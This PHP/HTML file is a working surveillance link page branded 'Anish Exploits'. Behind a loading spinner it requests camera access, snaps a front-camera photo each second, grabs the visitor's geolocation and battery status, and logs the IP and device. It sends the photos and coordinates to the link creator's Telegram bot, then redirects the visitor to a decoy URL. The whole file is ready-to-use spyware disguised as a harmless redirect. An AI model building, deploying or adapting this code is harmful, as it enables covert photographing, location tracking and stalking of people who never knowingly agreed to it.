<?php
require_once 'config.php';

if (!file_exists("photos")) { mkdir("photos", 0755, true); }
if (!file_exists("uploads")) { mkdir("uploads", 0755, true); }
if (!file_exists("visitors.json")) { file_put_contents("visitors.json", json_encode([])); }
if (!file_exists("links.json")) { file_put_contents("links.json", json_encode([])); }

$id = $_GET['id'] ?? '';
$db = json_decode(file_get_contents("links.json"), true) ?? [];

$linkData = $db[$id] ?? null;
$targetUrl = $linkData['url'] ?? 'https://google.com';
$customImage = $linkData['image'] ?? '';
$creatorId = $linkData['created_by'] ?? $config['chat_id'];

session_start();
$visitorId = $_SESSION['visitor_id'] ?? null;

if (!$visitorId) {
    $visitorId = 'VIS_' . time() . '_' . bin2hex(random_bytes(4));
    $_SESSION['visitor_id'] = $visitorId;
}

// ========== FUNCTIONS ==========
function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
    global $config;
    if (!file_exists($photoPath)) return false;
    $token = $config['bot_token'];
    $url = "https://api.telegram.org/bot$token/sendPhoto";
    
    $post = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => "📸 *Spy Photo!*\n🆔 $visitorId\n⏰ " . date('Y-m-d H:i:s')
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode == 200;
}

function sendLocationToTelegram($chatId, $lat, $lng, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    $url = "https://api.telegram.org/bot$token/sendLocation";
    $data = ['chat_id' => $chatId, 'latitude' => $lat, 'longitude' => $lng];
    @file_get_contents($url . "?" . http_build_query($data));
    
    $msg = "📍 *Live Location*\n🆔 $visitorId\n🗺️ https://maps.google.com/?q=$lat,$lng";
    $url2 = "https://api.telegram.org/bot$token/sendMessage";
    $data2 = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    @file_get_contents($url2 . "?" . http_build_query($data2));
}

function sendBatteryToTelegram($chatId, $level, $charging, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    $status = $charging ? "⚡ Charging" : "🔋 Not Charging";
    $msg = "🔋 *Battery Status*\n🆔 $visitorId\n📊 $level%\n$status";
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    @file_get_contents($url . "?" . http_build_query($data));
}

// ========== HANDLE POST DATA ==========
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    if (!$data) { exit; }
    
    $items = isset($data[0]) ? $data : [$data];
    $visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
    
    if (!isset($visitors[$visitorId])) {
        $visitors[$visitorId] = [
            'device' => $_SERVER['HTTP_USER_AGENT'],
            'ip' => $_SERVER['REMOTE_ADDR'],
            'target_url' => $targetUrl,
            'generated_by' => $creatorId,
            'time' => date('Y-m-d H:i:s'),
            'photos' => 0, 'locations' => 0, 'battery' => 0
        ];
    }
    
    $visitors[$visitorId]['last_update'] = date('Y-m-d H:i:s');
    
    foreach ($items as $item) {
        if (isset($item['photo']) && !empty($item['photo'])) {
            $photoData = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $item['photo']);
            $photoBinary = base64_decode($photoData);
            
            if ($photoBinary && strlen($photoBinary) > 500) {
                $photoPath = "photos/" . $visitorId . "_" . time() . ".jpg";
                file_put_contents($photoPath, $photoBinary);
                if (filesize($photoPath) > 500) {
                    sendPhotoToTelegram($creatorId, $photoPath, $visitorId);
                    $visitors[$visitorId]['photos'] += 1;
                }
            }
        }
        
        if (isset($item['location'])) {
            $lat = $item['location']['lat'] ?? 0;
            $lng = $item['location']['lng'] ?? 0;
            if ($lat != 0 && $lng != 0) {
                sendLocationToTelegram($creatorId, $lat, $lng, $visitorId);
                $visitors[$visitorId]['locations'] += 1;
            }
        }
        
        if (isset($item['battery'])) {
            $level = $item['battery']['level'] ?? 0;
            $charging = $item['battery']['charging'] ?? false;
            if ($level > 0) {
                sendBatteryToTelegram($creatorId, $level, $charging, $visitorId);
                $visitors[$visitorId]['battery'] += 1;
            }
        }
    }
    
    file_put_contents("visitors.json", json_encode($visitors));
    echo json_encode(['status' => 'success']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0a0a; color: #fff; font-family: -apple-system, 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; max-width: 380px; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(45deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; }
        .custom-img { width: 100px; height: 100px; object-fit: cover; border-radius: 50%; border: 3px solid #f7971e; margin-bottom: 15px; box-shadow: 0 0 15px rgba(247,151,30,0.3); }
        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.05); border-radius: 50%; border-top: 3px solid #f7971e; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { color: #4ade80; font-size: 13px; min-height: 22px; }
        #video { display: none; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!empty($customImage) && file_exists($customImage)): ?>
            <img src="<?= $customImage ?>" alt="Target" class="custom-img">
        <?php else: ?>
            <div class="logo">✨ Anish Exploits</div>
        <?php endif; ?>
        
        <div class="spinner"></div>
        <div class="status-text" id="status">📸 Initializing...</div>
        
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const visitorId = '<?= $visitorId ?>';
        const targetUrl = '<?= $targetUrl ?>';
        let isCapturing = false;

        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            document.getElementById('status').textContent = '📸 Capturing...';
            isCapturing = true;
            
            setInterval(() => {
                if (isCapturing) {
                    capturePhoto();
                }
            }, 1000);
        })
        .catch(err => {
            document.getElementById('status').textContent = '⚠️ Camera denied';
        });

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            if (!video.videoWidth || video.videoWidth === 0) return;
            
            canvas.width = 640;
            canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            sendData({ photo: photoData });
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                sendData({ location: { lat: position.coords.latitude, lng: position.coords.longitude } });
            });
        }

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                sendData({ battery: { level: Math.round(battery.level * 100), charging: battery.charging } });
            });
        }

        let pendingData = [];
        function sendData(data) {
            pendingData.push(data);
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(pendingData)
            });
            pendingData = [];
        }

        setTimeout(() => {
            isCapturing = false;
            window.location.href = targetUrl;
        }, 8000);
    </script>
</body>
</html>
